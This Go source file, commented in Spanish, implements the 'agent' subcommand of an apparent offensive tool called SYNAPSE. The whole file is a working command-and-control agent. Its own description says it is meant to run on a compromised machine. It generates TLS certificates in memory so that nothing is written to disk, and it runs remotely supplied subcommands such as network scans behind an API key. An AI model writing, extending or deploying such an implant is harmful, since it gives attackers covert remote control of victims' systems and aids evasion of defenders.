// FICHERO: agente.go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls" // Importante para los certificados en memoria
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/spf13/cobra"
)

// CommandRequest define la estructura de una orden enviada al agente.
type CommandRequest struct {
	Comando string   `json:"comando"`
	Args    []string `json:"args"`
}

// CommandResponse define la estructura de la respuesta del agente.
type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// Variables para los flags del comando.
var agentPort string
var apiKey string

// NewAgentCmd crea el comando 'agent'.
func NewAgentCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "agent",
		Short: "Inicia el agente para control remoto (C2)",
		Long: `Ejecuta un servidor HTTPS seguro que espera órdenes.
Permite controlar esta herramienta de forma remota en una máquina comprometida.
Genera automáticamente certificados SSL en memoria para una operación sin ficheros.`,
		Run: func(cmd *cobra.Command, args []string) {
			if apiKey == "" {
				log.Fatal("Error: Se requiere una clave API secreta (-k) para asegurar el agente.")
			}
			startAgentServer(agentPort, apiKey)
		},
	}

	cmd.Flags().StringVarP(&agentPort, "port", "p", "4443", "Puerto de escucha para el agente")
	cmd.Flags().StringVarP(&apiKey, "key", "k", "", "Clave API secreta para la autenticación")

	return cmd
}

// startAgentServer configura e inicia el servidor HTTPS del agente.
func startAgentServer(port, key string) {
	// Generar un certificado TLS en memoria para no escribir en disco.
	tlsCert, err := generateInMemoryCertificate()
	if err != nil {
		log.Fatalf("Error fatal al generar el certificado TLS en memoria: %v", err)
	}

	// Configurar los endpoints de la API.
	mux := http.NewServeMux()
	commandHandler := http.HandlerFunc(handleCommand)
	mux.Handle("/command", authMiddleware(commandHandler, key))
	mux.HandleFunc("/", handleRoot)

	// Configurar el servidor HTTPS para que use nuestro certificado en memoria.
	server := &http.Server{
		Addr:    ":" + port,
		Handler: mux,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{*tlsCert},
		},
	}

	log.Printf("Iniciando agente SYNAPSE en modo seguro (HTTPS) en el puerto %s...", port)
	log.Println("Utilizando certificados TLS generados en memoria (no se escriben en disco).")

	// Iniciar el servidor TLS sin especificar los ficheros de certificado/clave.
	err = server.ListenAndServeTLS("", "")
	if err != nil {
		log.Fatalf("Error fatal al iniciar el servidor del agente: %v", err)
	}
}

// handleRoot es un endpoint simple para verificar que el agente está vivo.
func handleRoot(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "SYNAPSE Agent Activo. Esperando órdenes en /command.")
}

// authMiddleware protege los endpoints que requieren autenticación.
func authMiddleware(next http.Handler, expectedKey string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		clientKey := r.Header.Get("X-API-Key")
		if clientKey != expectedKey {
			http.Error(w, "Acceso no autorizado", http.StatusUnauthorized)
			log.Printf("Intento de conexión fallido desde %s con clave incorrecta.", r.RemoteAddr)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// handleCommand recibe y ejecuta los comandos.
func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Método no permitido", http.StatusMethodNotAllowed)
		return
	}

	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Error al decodificar el cuerpo de la petición: "+err.Error(), http.StatusBadRequest)
		return
	}

	log.Printf("Orden recibida desde %s: comando='%s', args=%v", r.RemoteAddr, req.Comando, req.Args)

	// Obtener la ruta del ejecutable actual para llamarse a sí mismo.
	executable, err := os.Executable()
	if err != nil {
		http.Error(w, "No se pudo encontrar la ruta del ejecutable: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Construir el comando completo (ej: 'scaner-pro.exe scan 192.168.1.1 80').
	fullArgs := append([]string{req.Comando}, req.Args...)
	cmd := exec.Command(executable, fullArgs...)

	// Ejecutar el comando y capturar la salida (stdout y stderr combinados).
	output, err := cmd.CombinedOutput()

	resp := CommandResponse{
		Output: string(output),
	}
	if err != nil {
		resp.Error = err.Error()
		log.Printf("Error al ejecutar la orden '%s': %s", req.Comando, err.Error())
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// generateInMemoryCertificate crea un certificado TLS y lo devuelve en memoria.
func generateInMemoryCertificate() (*tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"SYNAPSE Agent"},
			CommonName:   "SYNAPSE C2",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0), // Válido por 1 año
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}

	// Crear la estructura de certificado TLS que el servidor necesita, sin guardarla en disco.
	cert := &tls.Certificate{
		Certificate: [][]byte{derBytes},
		PrivateKey:  priv,
	}

	return cert, nil
}